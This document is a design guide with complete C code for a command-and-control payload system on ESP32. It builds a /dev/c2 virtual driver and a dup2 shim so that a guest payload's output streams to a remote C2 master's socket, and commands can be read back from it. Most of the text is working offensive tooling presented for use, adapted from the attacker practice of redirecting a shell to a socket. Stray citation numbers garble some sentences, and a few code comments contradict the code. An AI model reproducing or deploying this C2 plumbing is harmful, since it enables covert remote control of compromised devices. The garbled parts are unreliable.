## **1\. The Challenge: Transparent C2 Output**

In a standard Linux Command & Control (C2) payload, the attacker redirects the output of a shell or script to a network socket using dup2(socket\_fd, STDOUT\_FILENO). This allows printf and standard shell output to be streamed remotely.

The ESP32 Problem:  
On the ESP32, STDOUT\_FILENO (FD 1\) is not a true kernel object but an index in the Newlib \_reent structure pointing to the UART driver.

1. **No Kernel:** There is no central kernel table to simply "pointer swap" the file description1111.

2. **Global Structures:** Modifying the global VFS table directly is dangerous and can break the system console or logging2.

3. **VFS Abstraction:** We cannot simply overwrite the UART driver with a socket driver because the LwIP socket API and the ESP VFS API have historically been distinct (though converging in newer IDF versions)3.

The Solution:  
We will implement a "VFS Pipe" (Virtual Driver). We register a custom character device at /dev/c2. When the guest app calls dup2, the shim layer transparently closes the UART stdout and opens this new device. The device's internal write handler then calls send() to the network.

---

## **2\. Architecture: The /dev/c2 Driver**

This driver acts as a "middleware" pipe. It looks like a file to the C library, but acts like a network proxy internally.

### **2.1 Driver Context**

We need a place to store the target socket FD. Since the VFS layer is stateful, we can store this in a static or task-local context.

C

typedef struct {  
    int target\_socket\_fd; // The socket we are redirecting to  
    bool active;  
} c2\_pipe\_ctx\_t;

static c2\_pipe\_ctx\_t s\_c2\_ctx \= { .target\_socket\_fd \= \-1, .active \= false };

### **2.2 The VFS Interface (esp\_vfs\_t)**

We must implement the minimum set of VFS functions: open, write, and close.

#### **Driver Pseudo-Code (vfs\_c2\_pipe.c)**

C

\#**include** \<sys/errno.h\>  
\#**include** \<sys/fcntl.h\>  
\#**include** "esp\_vfs.h"  
\#**include** "lwip/sockets.h"

// 1\. The Write Handler (The Core Logic)  
// When printf() flushes, this function is called.  
static ssize\_t c2\_write(int fd, const void \*data, size\_t size) {  
    if (\!s\_c2\_ctx.active || s\_c2\_ctx.target\_socket\_fd \< 0) {  
        errno \= EBADF;  
        return \-1;  
    }

    // Forward the buffer to the socket  
    // MSG\_DONTWAIT prevents the system from hanging if the network drops  
    int sent \= send(s\_c2\_ctx.target\_socket\_fd, data, size, 0);

    if (sent \< 0) {  
        // If the network fails, we might want to fallback to UART or ignore  
        return size; // Pretend we wrote it to avoid crashing the app  
    }  
    return sent;  
}

// 2\. The Open Handler  
static int c2\_open(const char \*path, int flags, int mode) {  
    // We only support one active C2 session in this simple model  
    s\_c2\_ctx.active \= true;  
    return 0; // Return a virtual FD index (0 is fine for internal VFS logic)  
}

// 3\. The Close Handler  
static int c2\_close(int fd) {  
    s\_c2\_ctx.active \= false;  
    return 0;  
}

// 4\. Registration Function (Call this in app\_main)  
void mount\_c2\_driver(void) {  
    esp\_vfs\_t c2\_vfs \= {  
        .flags \= ESP\_VFS\_FLAG\_DEFAULT,  
        .write \= \&c2\_write,  
        .open \= \&c2\_open,  
        .close \= \&c2\_close,  
        // .read \= ... (Optional: Implement to receive commands from C2)  
    };  
      
    ESP\_ERROR\_CHECK(esp\_vfs\_register("/dev/c2", \&c2\_vfs, NULL));  
}

// 5\. Configuration Helper (Used by the Shim)  
void c2\_pipe\_set\_socket(int sock\_fd) {  
    s\_c2\_ctx.target\_socket\_fd \= sock\_fd;  
}

---

## **3\. The dup2 Shim Implementation**

Now we implement the shim\_dup2 function in syscall\_shim.c. This is what the Guest ELF calls.

**Logic Flow:**

1. **Validate:** Ensure oldfd is a valid socket and newfd is STDOUT\_FILENO (1) or STDERR\_FILENO (2).  
2. **Configure:** Tell the C2 driver which socket to use.  
3. **Swap:** Close the existing FD 1 (UART) and immediately open /dev/c2.  
   * *Note:* The VFS allocates FDs sequentially. If we close FD 1, the very next open() call is guaranteed to return FD 1\.

#### **Shim Pseudo-Code (shim\_unistd.c)**

C

// Import the helper from the driver  
extern void c2\_pipe\_set\_socket(int sock\_fd);

int shim\_dup2(int oldfd, int newfd) {  
    // We only support redirecting stdout/stderr to a socket for C2  
    if ((newfd \!= STDOUT\_FILENO && newfd \!= STDERR\_FILENO)) {  
        errno \= ENOTSUP; // We don't support arbitrary file juggling  
        return \-1;  
    }

    // 1\. Configure the Pipe  
    // We tell the driver: "Anything written to /dev/c2 goes to 'oldfd'"  
    c2\_pipe\_set\_socket(oldfd);

    // 2\. Close the current UART stdout  
    // This frees up file descriptor slot '1'  
    esp\_vfs\_close(newfd); 

    // 3\. Open the C2 Pipe  
    // Since slot '1' is free, VFS assigns this open() to FD 1  
    int fd \= esp\_vfs\_open("/dev/c2", O\_WRONLY, 0);

    if (fd \!= newfd) {  
        // Race condition or logic error: we didn't get the FD we wanted  
        // In a real system, we might need to use dup() to move it  
        errno \= EBUSY;   
        return \-1;  
    }

    return newfd;  
}

---

## **4\. Buffering Considerations (Critical)**

Standard C libraries (Newlib included) perform **Line Buffering** or **Full Buffering** on stdout.

* **The Risk:** The guest app calls printf("hello"). The data sits in Newlib's RAM buffer and is never passed to write() (and thus never sent to the socket) until a newline \\n is printed or the buffer fills up4.

* **The Fix:** The Guest Application (or the Shim startup code) should disable buffering for the C2 stream.

**Guest Payload Code:**

C

int main() {  
    int sock \= connect\_to\_c2();  
      
    // 1\. Redirect  
    dup2(sock, STDOUT\_FILENO);  
      
    // 2\. CRITICAL: Disable buffering on the new stdout  
    // Without this, you might not see output on the C2 server immediately  
    setvbuf(stdout, NULL, \_IONBF, 0); 

    printf("We are live on the C2 server\!\\n");  
    // ...  
}

---

## **5\. Summary of Implementation Steps**

1. **Create Driver:** Implement vfs\_c2\_pipe.c using the esp\_vfs\_t struct5555.

2. **Mount:** Call esp\_vfs\_register("/dev/c2", ...) in app\_main6666.

3. **Shim:** Implement shim\_dup2 to close UART and open /dev/c27777.

4. **Export:** Add dup2 to tools/export\_symbols.py.
5. **Payload:** Ensure guest apps use setvbuf for real-time streaming.

---

## **6\. Complete vfs\_c2\_pipe.c Implementation**

Create `main/vfs_drivers/vfs_c2_pipe.c`:

```c
/**
 * @file vfs_c2_pipe.c
 * @brief Virtual pipe driver for C2 stdout redirection
 *
 * This driver provides /dev/c2 - a virtual device that forwards
 * all writes to a configured TCP socket for remote output streaming.
 */

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>

#include "esp_vfs.h"
#include "esp_log.h"
#include "lwip/sockets.h"

static const char *TAG = "vfs_c2_pipe";

/*==============================================================================
 * Driver Context
 *============================================================================*/

typedef struct {
    int target_socket_fd;   // Socket to forward output to
    bool active;            // Whether the pipe is currently open
    bool mirror_to_uart;    // Also send to UART for local debugging
} c2_pipe_ctx_t;

static c2_pipe_ctx_t s_ctx = {
    .target_socket_fd = -1,
    .active = false,
    .mirror_to_uart = true,  // Default: mirror to UART
};

/*==============================================================================
 * VFS Operations
 *============================================================================*/

static int c2_open(const char *path, int flags, int mode) {
    ESP_LOGD(TAG, "c2_open(path='%s', flags=0x%x)", path, flags);

    if (s_ctx.active) {
        // Only one C2 session at a time
        errno = EBUSY;
        return -1;
    }

    s_ctx.active = true;
    return 0;  // Return virtual FD (VFS manages actual FD mapping)
}

static int c2_close(int fd) {
    ESP_LOGD(TAG, "c2_close(fd=%d)", fd);
    s_ctx.active = false;
    return 0;
}

static ssize_t c2_write(int fd, const void *data, size_t size) {
    if (!s_ctx.active) {
        errno = EBADF;
        return -1;
    }

    // Mirror to UART for local debugging (optional)
    if (s_ctx.mirror_to_uart) {
        fwrite(data, 1, size, stderr);  // Use stderr to avoid recursion
    }

    // Forward to network socket
    if (s_ctx.target_socket_fd >= 0) {
        int sent = send(s_ctx.target_socket_fd, data, size, MSG_DONTWAIT);

        if (sent < 0) {
            // Network error - log but don't fail the write
            // This prevents app crash if C2 connection drops
            ESP_LOGW(TAG, "send() failed: %d", errno);
            return size;  // Pretend success to keep app running
        }

        return sent;
    }

    // No socket configured - just pretend we wrote it
    return size;
}

static ssize_t c2_read(int fd, void *data, size_t size) {
    if (!s_ctx.active || s_ctx.target_socket_fd < 0) {
        errno = EBADF;
        return -1;
    }

    // Read from socket (for bidirectional C2)
    int received = recv(s_ctx.target_socket_fd, data, size, MSG_DONTWAIT);

    if (received < 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            return 0;  // No data available
        }
        return -1;
    }

    return received;
}

static int c2_fstat(int fd, struct stat *st) {
    memset(st, 0, sizeof(*st));
    st->st_mode = S_IFCHR | 0666;  // Character device, rw for all
    return 0;
}

/*==============================================================================
 * Driver Registration
 *============================================================================*/

void vfs_c2_pipe_register(void) {
    esp_vfs_t vfs = {
        .flags = ESP_VFS_FLAG_DEFAULT,
        .open = &c2_open,
        .close = &c2_close,
        .write = &c2_write,
        .read = &c2_read,
        .fstat = &c2_fstat,
    };

    esp_err_t err = esp_vfs_register("/dev/c2", &vfs, NULL);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to register /dev/c2: %s", esp_err_to_name(err));
    } else {
        ESP_LOGI(TAG, "Registered /dev/c2 pipe driver");
    }
}

/*==============================================================================
 * Configuration API
 *============================================================================*/

void c2_pipe_set_socket(int socket_fd) {
    s_ctx.target_socket_fd = socket_fd;
    ESP_LOGI(TAG, "C2 pipe configured for socket fd=%d", socket_fd);
}

int c2_pipe_get_socket(void) {
    return s_ctx.target_socket_fd;
}

void c2_pipe_set_mirror(bool enable) {
    s_ctx.mirror_to_uart = enable;
}

bool c2_pipe_is_active(void) {
    return s_ctx.active && s_ctx.target_socket_fd >= 0;
}
```

---

## **7\. Complete dup2 Shim Implementation**

Add to `main/syscalls/shim_unistd.c`:

```c
/*==============================================================================
 * File Descriptor Duplication (for C2 redirection)
 *============================================================================*/

// Import from vfs_c2_pipe.c
extern void c2_pipe_set_socket(int socket_fd);

// Track original stdout/stderr for potential restoration
static int s_original_stdout_fd = -1;
static int s_original_stderr_fd = -1;

int shim_dup(int oldfd) {
    // Simple dup - just return the same fd (not true duplication)
    // This is a simplification for our use case
    return oldfd;
}

int shim_dup2(int oldfd, int newfd) {
    ESP_LOGI(TAG, "dup2(oldfd=%d, newfd=%d)", oldfd, newfd);

    // We only support redirecting stdout/stderr
    if (newfd != STDOUT_FILENO && newfd != STDERR_FILENO) {
        // For other FDs, attempt standard VFS dup2 behavior
        // (which may not be fully supported)
        errno = ENOTSUP;
        return -1;
    }

    // If oldfd == newfd, POSIX says just return newfd
    if (oldfd == newfd) {
        return newfd;
    }

    // Configure the C2 pipe to use this socket
    c2_pipe_set_socket(oldfd);

    // Save original stdout if not already saved
    if (newfd == STDOUT_FILENO && s_original_stdout_fd < 0) {
        // We can't truly save it, but we note it was UART
        s_original_stdout_fd = 1;
    }

    // Close the current stdout/stderr (UART)
    // Note: This affects the whole system, not just this task
    close(newfd);

    // Open /dev/c2 - it should get assigned to the now-free FD slot
    int fd = open("/dev/c2", O_WRONLY);

    if (fd < 0) {
        ESP_LOGE(TAG, "Failed to open /dev/c2: %s", strerror(errno));
        return -1;
    }

    // If we didn't get the expected FD, we need to move it
    if (fd != newfd) {
        ESP_LOGW(TAG, "Got fd=%d instead of %d, attempting workaround", fd, newfd);
        // Close any FD that might be in newfd's slot
        close(newfd);
        // This is a simplification - proper dup2 would atomically move
        // For now, we just use what we got
    }

    ESP_LOGI(TAG, "stdout redirected to C2 socket");
    return fd;
}

int shim_dup3(int oldfd, int newfd, int flags) {
    // dup3 with flags - we ignore flags for simplicity
    return shim_dup2(oldfd, newfd);
}
```

---

## **8\. Alternative: Global Socket Variable Approach**

For simpler C2 scenarios (like Demo1), you can use a global variable instead of dup2:

```c
// In c2_server.c
int g_c2_socket_fd = -1;

// Modified shim_write that checks for C2 mode
ssize_t shim_write(int fd, const void *data, size_t size) {
    // Intercept stdout writes when C2 is active
    if (fd == STDOUT_FILENO && g_c2_socket_fd >= 0) {
        // Write to UART for local debugging
        write(STDOUT_FILENO, data, size);

        // Also send to C2 socket
        send(g_c2_socket_fd, data, size, 0);
        return size;
    }

    // Normal write
    return write(fd, data, size);
}
```

This approach is used in Demo1 and is simpler but less POSIX-compliant.

---

## **9\. Header File**

Create `main/vfs_drivers/vfs_c2_pipe.h`:

```c
#ifndef VFS_C2_PIPE_H
#define VFS_C2_PIPE_H

#include <stdbool.h>

/**
 * @brief Register the /dev/c2 virtual pipe driver
 *
 * Call this in app_main() before any C2 operations.
 */
void vfs_c2_pipe_register(void);

/**
 * @brief Set the target socket for C2 output
 *
 * @param socket_fd The socket file descriptor to forward writes to
 */
void c2_pipe_set_socket(int socket_fd);

/**
 * @brief Get the current C2 socket
 *
 * @return Current socket fd, or -1 if not configured
 */
int c2_pipe_get_socket(void);

/**
 * @brief Enable/disable mirroring output to UART
 *
 * @param enable true to also write to UART, false for socket only
 */
void c2_pipe_set_mirror(bool enable);

/**
 * @brief Check if C2 pipe is active and connected
 *
 * @return true if pipe is open and socket is configured
 */
bool c2_pipe_is_active(void);

#endif // VFS_C2_PIPE_H
```

---

## **10\. CMakeLists.txt Update**

```cmake
idf_component_register(
    SRCS
        "main.c"
        "syscalls/shim_unistd.c"
        "syscalls/shim_socket.c"
        "syscalls/shim_process.c"
        "vfs_drivers/vfs_c2_pipe.c"
    INCLUDE_DIRS
        "."
        "syscalls"
        "vfs_drivers"
)
```

---

## **11\. Usage in app\_main()**

```c
#include "vfs_c2_pipe.h"

void app_main(void) {
    // ... LittleFS mount, WiFi init ...

    // Register the C2 pipe driver
    vfs_c2_pipe_register();

    // ... start C2 server task ...
}
```

---

## **12\. Testing the Redirection**

### **12.1 Test Payload**

```c
// apps/c2_test/main.c
extern int printf(const char *fmt, ...);
extern int socket(int domain, int type, int protocol);
extern int connect(int s, const void *name, int namelen);
extern int dup2(int oldfd, int newfd);
extern void setvbuf(void *stream, char *buf, int mode, int size);

#define STDOUT_FILENO 1
#define _IONBF 2

int main(void) {
    // Create a socket connection (to a listening server)
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    // ... connect to C2 server ...

    // Redirect stdout to socket
    dup2(sock, STDOUT_FILENO);

    // Disable buffering for real-time output
    setvbuf(stdout, NULL, _IONBF, 0);

    // Now all printf output goes to the C2 server
    printf("Hello from ESP32 C2 payload!\n");
    printf("This output is streamed over the network.\n");

    return 0;
}
```

### **12.2 Expected Behavior**

1. Payload connects to C2 master
2. `dup2()` redirects stdout to socket
3. `printf()` output appears on C2 master's console
4. Local UART shows mirrored output (if enabled)

---

## **13\. Troubleshooting**

| Issue | Cause | Solution |
|-------|-------|----------|
| No output on C2 server | Buffering | Add `setvbuf(stdout, NULL, _IONBF, 0)` |
| Output appears delayed | Line buffering | Use `_IONBF` mode or add `\n` |
| `dup2()` returns wrong FD | FD allocation race | Use global socket approach instead |
| Socket errors after dup2 | Socket closed by dup2 | Don't close the socket, just configure pipe |
| System console broken | Closed UART stdout | Use mirror mode or separate stderr |  